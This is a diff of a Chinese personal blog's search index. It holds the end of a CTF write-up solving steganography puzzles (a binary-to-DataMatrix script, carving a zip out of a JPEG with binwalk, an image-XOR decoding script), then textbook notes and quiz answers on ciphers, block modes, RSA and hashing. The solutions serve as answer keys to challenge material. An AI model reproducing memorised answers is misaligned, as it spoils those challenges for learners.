+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">binary_value=<span class="built_in">bin</span>(<span class="number">0xAAAAAAAAA92FA88BA664D1E08EDFA2479912C45CC2A3DD25ED44DA1E8EAFFA6BD154C732A32BCE0BC65491D4A8C9BB1B9110C150E223DD4DD46E8C5EFFFFFFFFAAAAAAAAAAA99283B152D446A2B3D145E74ED7E48885992B9D60A662AB77A05FFC649666CA53AD43B48EC59EBF119825EAF2A2EC82A7B4BBB256E5E6FFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line">binary_string=binary_value[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binary_string)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(binary_string))</span><br><span class="line"><span class="comment"># 1024=32x32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串转换为二维数组</span></span><br><span class="line">binary_list = [binary_string[i:i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将二进制转换为黑白图案</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary_list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary_list[i])):</span><br><span class="line">        <span class="keyword">if</span> binary_list[i][j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;██&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
+<ol start="10">
+<li>出来的DataMatrix码找个网站扫扫，即为flag</li>
+</ol>
+<h3 id="ez-gugugu"><a href="#ez-gugugu" class="headerlink" title="ez_gugugu"></a>ez_gugugu</h3><ol>
+<li><p>将gugugu.jpg用winhex打开后发现尾部有<code>PK</code>和<code>flag.txt</code>字样</p>
+</li>
+<li><p>分离</p>
+<p> 用binwalk打开<br> <code>python binwalk -e gugugu.jpg</code><br> 输出</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">102642        0x190F2         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>
+<p> 分离zip文件<br> <code>python binwalk -D &quot;zip archive:zip&quot; gugugu.jpg</code><br> 我自己做时应该还能用，不知道为什么写wp时分离不成功了</p>
+<p> 或者在winhex里搜索十六进制数值<code>FFD9</code>，复制其后面的十六进制，发现zip文件头损坏，补上<code>504B</code>，粘贴为zip文件保存</p>
+</li>
+<li><p>zip压缩包提示有密码</p>
+</li>
+</ol>
+<p>根据encode.py写</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">f1 = Image.<span class="built_in">open</span>(<span class="string">&quot;next.png&quot;</span>)</span><br><span class="line">f1 = f1.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">f2 = Image.<span class="built_in">open</span>(<span class="string">&quot;ff.png&quot;</span>)</span><br><span class="line">f2 = f2.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">new = Image.new(<span class="string">&quot;RGB&quot;</span>, f2.size)</span><br><span class="line">h = f2.height</span><br><span class="line">w = f2.width</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"><span class="built_in">print</span>(w)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        r1, g1, b1 = f1.getpixel((j, i))</span><br><span class="line">        r2, g2, b2 = f2.getpixel((j, i))</span><br><span class="line">        new.putpixel((w-j-<span class="number">1</span>, h-i-<span class="number">1</span>), (r1 ^ g2, g1 ^ b2, b1 ^ r2))</span><br><span class="line">new.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>在flag.png上得到压缩包密码，打开压缩包，得到flag</li>
+</ol>
+]]></content>
+      <categories>
+        <category>做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《图解密码技术》读书笔记</title>
+    <url>/2023/01/28/%E3%80%8A%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>不会吧不会吧不会真有人连读书笔记都往网上发吧</p>
+<span id="more"></span>
+<p>读《图解密码技术》ing。。<br>还挺有意思的这本书。。找了个图床贴点图片。。希望图片不会裂掉。。</p>
+<p><img src="https://img.mjj.today/2023/01/28/33fad240cf463b69695e9ec84f106339.png" alt="33fad240cf463b69695e9ec84f106339.png"></p>
+<p>记点可能有用的。。</p>
+<h1 id="第一部分：密码"><a href="#第一部分：密码" class="headerlink" title="第一部分：密码"></a>第一部分：密码</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><blockquote>
+<p>正当的接收者将密文还原为明文称为“解密”，但接收者以外的其他人试图将密文还原为明文，则称为密码破译( cryptanalysis )，简称为破译，有时也称为密码分析。</p>
+</blockquote>
+<h4 id="对称密码与公钥密码"><a href="#对称密码与公钥密码" class="headerlink" title="对称密码与公钥密码"></a>对称密码与公钥密码</h4><p><img src="https://img.mjj.today/2023/01/28/fddf2ceb003526dcf7df0b66f5676dec.png" alt="fddf2ceb003526dcf7df0b66f5676dec.png"></p>
+<h4 id="隐写术与密码"><a href="#隐写术与密码" class="headerlink" title="隐写术与密码"></a>隐写术与密码</h4><blockquote>
+<p>隐写术的目的是隐藏消息本身，但如果搞清楚了嵌人消息的方法，也就可以搞清楚消息的内容。因此，隐写术并不能代替密码。<br>密码隐藏的是内容，隐写术隐藏的是消息本身。通过将密码与隐写术相结合，就可以同时产生两者所各自具备的效果。</p>
+</blockquote>
+<h4 id="密码与信息安全常识"><a href="#密码与信息安全常识" class="headerlink" title="密码与信息安全常识"></a>密码与信息安全常识</h4><blockquote>
+<p>●不要使用保密的密码算法</p>
+<ol>
+<li>密码算法的秘密早晚都会被公诸于世</li>
+<li>开发高强度的密码算法是非常困难的</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>●使用低强度的密码比不进行任何加密更危险<br>●任何密码总有一天都会被破解（但是量子密码不好说<br>●密码只是信息安全的一部分</p>
+</blockquote>
+<h4 id="小测验"><a href="#小测验" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>发送者Alice接收者Alice<br>小测验2<br>OXXOX</p>
+<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h4 id="恺撒密码"><a href="#恺撒密码" class="headerlink" title="恺撒密码"></a>恺撒密码</h4><blockquote>
+<p>密码算法:将明文中的各个字母按照指定的字母数平移<br>密钥:平移的字母数量</p>
+</blockquote>
+<h4 id="简单替换密码"><a href="#简单替换密码" class="headerlink" title="简单替换密码"></a>简单替换密码</h4><blockquote>
+<p>密码算法:按照替换表对字母表进行替换<br>密钥:替换表</p>
+</blockquote>
+<h4 id="Enigma-通信密码的加密"><a href="#Enigma-通信密码的加密" class="headerlink" title="Enigma(通信密码的加密)"></a>Enigma(通信密码的加密)</h4><blockquote>
+<p>密码算法:使用Enigma密码机，通过接线板的接线方式、3个转子的顺序、每个转子的旋转位置对字母进行替换<br>密钥(每日密码):接线板的接线方式、3个转子的顺序、每个转子的旋转位置</p>
+</blockquote>
+<h4 id="Enigma-通信电文的加密"><a href="#Enigma-通信电文的加密" class="headerlink" title="Enigma (通信电文的加密)"></a>Enigma (通信电文的加密)</h4><blockquote>
+<p>密码算法:使用接线板的接线方式和3个转子的顺序固定的Enigma密码机，按照每个转子的旋转位置对字母进行替换<br>密钥(通信密码):每个转子的旋转位置</p>
+</blockquote>
+<h4 id="小测验-1"><a href="#小测验-1" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>CRYPTOGRAPHY<br>小测验2<br>错<br>小测验3<br><del>不道哇</del></p>
+<h5 id="小测验3答案"><a href="#小测验3答案" class="headerlink" title="小测验3答案"></a>小测验3答案</h5><p>小测验3的答案:没有L的密文<br>明文是一段只有字母L的文字，即LLLLL….发送者的目的是将毫无意义的明文加密发送以干扰密码破译者。<br>然而密码破译者知道Enigma的构造，即无论接线板如何接线，3个转子的顺序和每个转子的旋转位置如何改变，输入的字母都绝对不可能被替换成该字母本身。通过密文中没有L这一事实，密码破译者就能够推测出其明文可能是一串L。<br>此外，密码破译者还能够根据密文的排列组合继续进行破译，从而得到推测Enigma的接线板和转子状态的线索。<br>发送者本想干扰密码破译者，却反而为破译者提供了线索。顺便提一下，破解这一谜题的破译者名叫Mavis Lever，是一位女性。</p>
+<h2 id="第三章：对称密码"><a href="#第三章：对称密码" class="headerlink" title="第三章：对称密码"></a>第三章：对称密码</h2><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>加密方式不算很明白，看了个大概<br>不过知道它可以被暴力破解</p>
+<h4 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h4><p>增强DES的强度</p>
+<h4 id="AES（Rijndael）"><a href="#AES（Rijndael）" class="headerlink" title="AES（Rijndael）"></a>AES（Rijndael）</h4><p>对称密码算法<br>逐字节替换&gt;向左平移&gt;矩阵运算&gt;XOR</p>
+<p>大家现在都用AES。。</p>
+<h4 id="小测验-2"><a href="#小测验-2" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>小于等于22的+3，大于等于23的-23<br>小测验2<br>错<br>小测验3<br><del>不道哇。。。我猜是E</del><br>小测验4<br><del>OXOXOO</del><br>OXXXOO</p>
+<h5 id="小测验3答案-1"><a href="#小测验3答案-1" class="headerlink" title="小测验3答案"></a>小测验3答案</h5><p><img src="https://img.mjj.today/2023/01/28/d2c62fbe2646bdcc5e72451d8447153a.png" alt="d2c62fbe2646bdcc5e72451d8447153a.png"></p>
+<h5 id="小测验4第3问答案"><a href="#小测验4第3问答案" class="headerlink" title="小测验4第3问答案"></a>小测验4第3问答案</h5><p>如果密钥长度为56比特，那么用暴力破解找到正确密钥需要平均尝试约2^28次。（X）<br>平均尝试次数是密钥总数的大约一半。当密钥长度为56比特时，密钥总数为2^56个，它的一半是2^55（注意，不是指数56变成一半得28，而是减1得55）。<br>因此，当密钥长度为56比特时，平均尝试次数为2^55次，大约相当于3.6x10^16次。</p>
+<h2 id="第四章：分组密码的模式"><a href="#第四章：分组密码的模式" class="headerlink" title="第四章：分组密码的模式"></a>第四章：分组密码的模式</h2><blockquote>
+<p>密码算法可以分为<strong>分组密码</strong>和<strong>流密码</strong>两种。</p>
+</blockquote>
+<blockquote>
+<p>分组密码处理完一个分组 就结束了，因此不需要通过内部状态来记录加密的进度;<br>相对地，流密码是对一串数据流进行连续处理，因此需要保持内部状态。</p>
+</blockquote>
+<blockquote>
+<p>前面提到的算法中，只有一次性密码本属于流密码，而DES、三重DES、AES( Rijndael )等大多数对称密码算法都属于分组密码。</p>
+</blockquote>
+<h4 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h4><p>将明文分组直接加密</p>
+<h5 id="ECB的风险"><a href="#ECB的风险" class="headerlink" title="ECB的风险"></a>ECB的风险</h5><blockquote>
+<p>ECB模式中，每个明文分组都各自独立地进行加密和解密，但这其实是一个很大的弱点。<br>假如存在主动攻击者Mallory，他能够改变密文分组的顺序。当接收者对密文进行解密时，由于密文分组的顺序被改变了，因此相应的明文分组的顺序也会被改变。也就是说，攻击者Mallory无需破译密码就能够操纵明文。在这个场景中，攻击者Mallory不需要破译密码，也不需要知道分组密码算法，他只要知道哪个分组记录了什么样的数据(即电文的格式)就可以了。</p>
+</blockquote>
+<p>btw，我还以为Mallory是女名。。</p>
+<h4 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h4><blockquote>
+<p>首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密</p>
+</blockquote>
+<p><img src="https://img.mjj.today/2023/01/28/383d9d5b787251945de63be98b21e732.png" alt="383d9d5b787251945de63be98b21e732.png"></p>
+<blockquote>
+<p>ECB模式和CBC模式的区别：ECB模式只进行了加密，而CBC模式则在加密之前进行了一次XOR。</p>
+</blockquote>
+<h4 id="CTS"><a href="#CTS" class="headerlink" title="CTS"></a>CTS</h4><p>ECB和CTF混合使用</p>
+<h4 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h4><p><img src="https://img.mjj.today/2023/01/28/91a945dd607f42d856e1ffba256b6f09.png" alt="91a945dd607f42d856e1ffba256b6f09.png"></p>
+<blockquote>
+<p>在CFB模式中，明文数据可以被逐比特加密，因此我们可以将CFB模式看作是一种使用分组密码来实现流密码的方式。</p>
+</blockquote>
+<h4 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h4><p><img src="https://img.mjj.today/2023/01/28/14ebda9ae34cb830ad7c485a89721396.png" alt="14ebda9ae34cb830ad7c485a89721396.png"></p>
+<h4 id="CTR"><a href="#CTR" class="headerlink" title="CTR"></a>CTR</h4><blockquote>
+<p>CTR模式的全称是CounTeR模式(计数器模式)。CTR模式是一种通过将逐次累加的计数器进行加密来生成密钥流的流密码。</p>
+</blockquote>
+<p><img src="https://img.mjj.today/2023/01/28/a55b5490b690e67ce60f1b1e85a73eda.png" alt="a55b5490b690e67ce60f1b1e85a73eda.png"></p>
+<h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p><img src="https://img.mjj.today/2023/01/28/f36d4213ed567f992f675b7da0f18a48.png" alt="f36d4213ed567f992f675b7da0f18a48.png"></p>
+<h4 id="小测验-3"><a href="#小测验-3" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>16<br>小测验2<br><del>把用户名称和口令错开。。</del><br>小测验3<br><del>能猜出初始化变量。。？</del><br>小测验4<br><del>不道哇。。</del><br>小测验5<br>等于通过XOR加密。。。。？<br>小测验6<br><del>XOXX</del></p>
+<h5 id="小测验2答案"><a href="#小测验2答案" class="headerlink" title="小测验2答案"></a>小测验2答案</h5><p>很多种方式，可以把口令用用户名称覆盖，这样子知道用户名就可以登陆了</p>
+<h5 id="小测验3答案-2"><a href="#小测验3答案-2" class="headerlink" title="小测验3答案"></a>小测验3答案</h5><blockquote>
+<p>在CBC模式中，我们假设永远使用相同的初始化向量。于是，当用同一密钥对同一明文进行加密时，所得到的密文一定是相同的。<br>例如，密码破译者间隔一周收到了两份相同的密文。于是，密码破译者无需破译密码，就可以判断出:这份密文和上周的密文一样，因此两份密文解密所得到的明文也是一样的。<br>如果在每次加密时都改变初始化向量的值，那么即便是用同一密钥对同一明文进行加密，也可以确保每次所得到的密文都不相同。</p>
+</blockquote>
+<h5 id="小测验4答案"><a href="#小测验4答案" class="headerlink" title="小测验4答案"></a>小测验4答案</h5><blockquote>
+<p>Alice的这个模式，实质上等同于ECB模式。</p>
+</blockquote>
+<h5 id="小测验6答案"><a href="#小测验6答案" class="headerlink" title="小测验6答案"></a>小测验6答案</h5><p>怎么能全错哇我要闹了我要闹了好崩溃。。。</p>
+<blockquote>
+<p>在ECB模式的加密中，内容相同的明文分组，一定会被转换为内容相同的密文分组。(O)</p>
+</blockquote>
+<blockquote>
+<p>在CBC模式的解密中，如果密文分组3损坏，则密文分组5是无法正确解密的。(X)<br>密文分组3损坏会导致密文分组3和4无法解密，但密文分组5依然能够正常解密。</p>
+</blockquote>
+<blockquote>
+<p>在CFB模式的加密中，不可以从明文的中间开始加密。(O)<br>正确。如果不是使用CFB模式，而是使用OFB模式或CTR模式的话，就可以从明文的中间开始加密。</p>
+</blockquote>
+<blockquote>
+<p>在OFB模式的解密中，分组密码算法本身所实际执行的是加密操作。(O)<br>正确。在CFB模式、OFB模式和CTR模式中，分组密码算法是用来生成密钥流的，因此，无论是加密还是解密，分组密码算法本身执行的都是相同的操作(加密操作)。</p>
+</blockquote>
+<h2 id="第五章：公钥密码"><a href="#第五章：公钥密码" class="headerlink" title="第五章：公钥密码"></a>第五章：公钥密码</h2><blockquote>
+<p>公钥密码( public-key cryptography )中，密钥分为加密密钥和解密密钥两种。发送者用加密密钥对消息进行加密，接收者用解密密钥对密文进行解密。要理解公钥密码，清楚地区分加密密钥和解密密钥是非常重要的。加密密钥是发送者加密时使用的，而解密密钥则是接收者解密时使用的。</p>
+</blockquote>
+<blockquote>
+<p>仔细思考一下加密密钥和解密密钥的区别，我们可以发现:<br>●发送者只需要加密密钥<br>●接收者只需要解密密钥<br>●解密密钥不可以被窃听者获取<br>●加密密钥被窃听者获取也没问题</p>
+</blockquote>
+<p><strong>公钥密码</strong>：又称<strong>非对称密码</strong><br><strong>加密密钥</strong>：一般为公开，又称<strong>公钥</strong><br><strong>解密密钥</strong>：绝对不能公开，又称<strong>私钥</strong></p>
+<blockquote>
+<p>公钥和私钥是一一 对应的， 一对公钥和私钥统称为密钥对( key pair )。由公钥进行加密的密文，必须使用与该公钥配对的私钥才能够解密。密钥对中的两个密钥之间具有非常密切的关系——数学上的关系——因此公钥 和私钥是不能分别单独生成的。<br>公钥密码的使用者需要生成一个包括公钥和私钥的密钥对，其中公钥会被发送给别人，而私钥则仅供自己使用。</p>
+</blockquote>
+<h4 id="mod运算"><a href="#mod运算" class="headerlink" title="mod运算"></a>mod运算</h4><blockquote>
+<p>A除以B求余数记作 <strong>A mod B</strong></p>
+</blockquote>
+<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p><img src="https://img.mjj.today/2023/01/28/d9f9829560a460ad3681aa0febebc11f.png" alt="d9f9829560a460ad3681aa0febebc11f.png"></p>
+<p>公钥：(E,N)</p>
+<blockquote>
+<p>E和N这两个数并不是密钥对(公钥和私钥的密钥对)。E和N两个数才组成了一个公钥，因此我们一.般会写成“公钥是(E, N)”或者“公钥是{E,N}”这样的形式，将E和N用括号括起来。</p>
+</blockquote>
+<p><img src="https://img.mjj.today/2023/01/28/d54ea3cbbccdf07c0be47bc1e1ef8aba.png" alt="d54ea3cbbccdf07c0be47bc1e1ef8aba.png"></p>
+<p>私钥：(D,N)</p>
+<p>N：两个质数(p,q)相乘<br>L：(p-1,q-1)的最小公倍数<br>E：1&lt;E&lt;L，E与L互质<br>D：1&lt;D&lt;L，E x D mod &#x3D; 1</p>
+<p><img src="https://img.mjj.today/2023/01/28/915301359b9b3bd856e356bb5119882f.png" alt="915301359b9b3bd856e356bb5119882f.png"></p>
+<hr>
+<p>好好笑这个例子。。放出来乐乐<br><img src="https://img.mjj.today/2023/01/28/f28ef45ddb5d49985638dfd9777c37bb.png" alt="f28ef45ddb5d49985638dfd9777c37bb.png"><br>Mallory在我这已经是是弯恋直求而不得拆散别人的坏女人了（恼<br>（我不管Mallory明明就是女名嘛</p>
+<hr>
+<h4 id="小测验-4"><a href="#小测验-4" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br><del>没必要吧。。Alice知道自己的私钥就好了</del><br>小测验2<br><del>自己也解不开了吧。。？</del><br>小测验3<br><del>9</del><br>小测验4<br><del>OOXXO</del></p>
+<h5 id="小测验错题答案"><a href="#小测验错题答案" class="headerlink" title="小测验错题答案"></a>小测验错题答案</h5><ol>
+<li>这是因为如果将Bob的密钥交给Alice，从此之后(即在本次通信结束之后) Alice就能够对用Bob的密钥加密的密文进行解密。也就是说，对于Bob来说，Alice 有可能成为一个窃听者。</li>
+<li>Alice的方法没有解决三重DES的密钥配送问题。<br>的确，将AES密钥通过三重DES加密后再发送的话，加密后的AES密钥就不怕被窃听。<br>但是，我们还是需要配送加密AES密钥时使用的那个密钥(三重DES的密钥)，否则接收者就无法解密AES密钥。<br>Alice的方法只是把问题转移了而已，并没有真正解决密钥配送问题。</li>
+<li><img src="https://img.mjj.today/2023/01/28/d30e249ddb83af37ba2f375aa912784a.png" alt="d30e249ddb83af37ba2f375aa912784a.png"></li>
+<li>OOXOO<br>(4)一般来说，对称密码的速度比公钥密码要快。</li>
+</ol>
+<h2 id="第六章：混合密码系统"><a href="#第六章：混合密码系统" class="headerlink" title="第六章：混合密码系统"></a>第六章：混合密码系统</h2><blockquote>
+<p>混合密码系统：<br>●用对称密码加密消息<br>●通过伪随机数生成器生成对称密码加密中使用的会话密钥<br>●用公钥密码加密会话密钥<br>●从混合密码系统外部赋予公钥密码加密时使用的密钥</p>
+</blockquote>
+<h4 id="小测验-5"><a href="#小测验-5" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>OXXO</p>
+<h1 id="第二部分：认证"><a href="#第二部分：认证" class="headerlink" title="第二部分：认证"></a>第二部分：认证</h1><h2 id="第七章：单向散列函数"><a href="#第七章：单向散列函数" class="headerlink" title="第七章：单向散列函数"></a>第七章：单向散列函数</h2><blockquote>
+<p><strong>单向散列函数</strong>(one-way hash function)&#x2F;<strong>消息摘要函数</strong>( message digest function )&#x2F;<strong>哈希函数</strong>&#x2F;<strong>杂凑函数</strong>有一个输入和一个输出；<br>其中输入称为<strong>消息</strong>(message)&#x2F;<strong>原像</strong>;<br>输出称为<strong>散列值</strong>(hash value)&#x2F;<strong>消息摘要</strong>&#x2F;<strong>指纹</strong>。</p>
+</blockquote>
+<blockquote>
+<p>单向散列函数可以根据消息的内容计算出散列值，而散列值就可以被用来检查消息的完整性。</p>
+</blockquote>
+<blockquote>
+<p>散列值的长度和消息的长度无关。</p>
+</blockquote>
+<blockquote>
+<p>如果单向散列函数计算出的散列值没有发生变化，那么消息很容易就会被篡改，这个单向散列函数也就无法被用于完整性的检查。两个不同的消息产生同一个散列值的情况称为<strong>碰撞</strong>(collision)。如果要将单向散列函数用于完整性的检查，则需要确保在事实上不可能被人为地发现碰撞。</p>
+</blockquote>
+<blockquote>
+<p>难以发现碰撞的性质称为<strong>抗碰撞性</strong>(collision resistance )。密码技术中所使用的单向散列函数，都需要具备抗碰撞性。</p>
+</blockquote>
+<p>单项散列函数需具备：<br><strong>弱抗碰撞性</strong>：要找到和该条消息具有相同散列值的另外一条消息是非常困难的；<br><strong>强抗碰撞性</strong>：要找到散列值相同的两条不同的消息是非常困难的；<br><strong>单向性</strong>：:无法通过散列值反算出消息的性质。</p>
+]]></content>
+      <categories>
+        <category>学习日记</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>简介</title>
+    <url>/2023/01/13/%E7%AE%80%E4%BB%8B/</url>
+    <content><![CDATA[<p><b>欢迎！</b><br>这里是林涂！很高兴认识你！<br>本人间歇性发疯中。。。</p>
+]]></content>
   </entry>
   <entry>
     <title>第一篇博客test</title>
